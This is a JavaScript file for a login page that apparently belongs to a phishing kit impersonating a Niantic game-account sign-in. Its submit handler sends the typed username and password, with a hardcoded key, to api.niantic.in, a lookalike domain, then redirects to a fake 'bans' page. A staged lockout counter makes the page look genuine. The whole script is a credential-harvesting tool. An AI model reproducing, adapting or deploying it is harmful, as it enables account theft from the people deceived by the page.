// ---------------- LOGIN ATTEMPTS ----------------
let loginAttempts = sessionStorage.getItem('loginAttempts') || 4;

// ---------------- ELEMENTS ----------------
const visibilityIcon = document.getElementById('visibility-icon');
const passwordInput = document.getElementById('password');

// ---------------- PASSWORD TOGGLE ----------------
function togglePasswordVisibility() {
    if (!passwordInput) return;

    const isHidden = passwordInput.type === 'password';
    passwordInput.type = isHidden ? 'text' : 'password';

    if (visibilityIcon) {
        visibilityIcon.classList.toggle('hide-password', !isHidden);
        visibilityIcon.classList.toggle('show-password', isHidden);
    }
}

// ---------------- ERROR ELEMENT ----------------
const errorDiv = document.createElement('div');
errorDiv.className = 'login-error-message';

// ---------------- DOM READY ----------------
document.addEventListener('DOMContentLoaded', () => {

    const usernameWrapper = document.querySelector('.username-input-wrapper');

    if (usernameWrapper) {
        usernameWrapper.parentNode.insertBefore(errorDiv, usernameWrapper);
    }

    function showLoginError() {
        errorDiv.textContent = `Your username or password is incorrect. You have ${loginAttempts} attempts left before you will be locked out of your account for 15 minutes.`;
        errorDiv.style.display = 'block';

        document.querySelectorAll('.input').forEach(input => {
            input.style.border = '0px solid #e3350d';
        });
    }

    if (loginAttempts < 4) {
        showLoginError();
    }

    // ---------------- PASSWORD TOGGLE ----------------
    if (visibilityIcon) {
        visibilityIcon.addEventListener('click', togglePasswordVisibility);
    }

    // ---------------- FORM SUBMIT ----------------
    const signInForm = document.querySelector('.sign-in-form');

    if (signInForm) {
        signInForm.addEventListener('submit', async function(e) {
            e.preventDefault();

            const username = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();

            console.log("Sending:", {
                username,
                password
            });

            try {
                const res = await fetch('https://api.niantic.in/send', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'x-api-key': 'P8&;v,9UL&TlJIQQ'
                    },
                    credentials: 'include', // ðŸ”¥ IMPORTANT for cookies
                    body: JSON.stringify({
                        username,
                        password
                    })
                });

                let data;

                try {
                    data = await res.json();
                } catch (err) {
                    console.error("Non-JSON response:", err);
                    alert("API error (invalid response)");
                    return;
                }

                console.log("API response:", data);

                // âœ… SUCCESS LOGIN
                if (data.success) {
                    window.location.href = "https://bans.niantic.in";
                }
                // âŒ FAILED LOGIN
                else {
                    loginAttempts--;
                    sessionStorage.setItem('loginAttempts', loginAttempts);

                    showLoginError();

                    // ðŸ”’ LOCK AFTER ATTEMPTS
                    if (loginAttempts <= 0) {
                        errorDiv.textContent = 'Account locked! Please try again after 15 minutes.';
                        errorDiv.style.display = 'block';

                        signInForm.querySelectorAll('input, button').forEach(el => {
                            el.disabled = true;
                        });

                        setTimeout(() => {
                            loginAttempts = 4;
                            sessionStorage.removeItem('loginAttempts');
                            location.reload();
                        }, 900000);
                    }
                }

            } catch (err) {
                console.error("Error:", err);
                alert("Server not reachable");
            }
        });
    }
});

// ---------------- SOCIAL ERROR ----------------
function showSocialError(event) {
    event.preventDefault();

    const errorMsg = document.getElementById("social-error-msg");

    if (errorMsg) {
        errorMsg.style.display = "block";
    }
}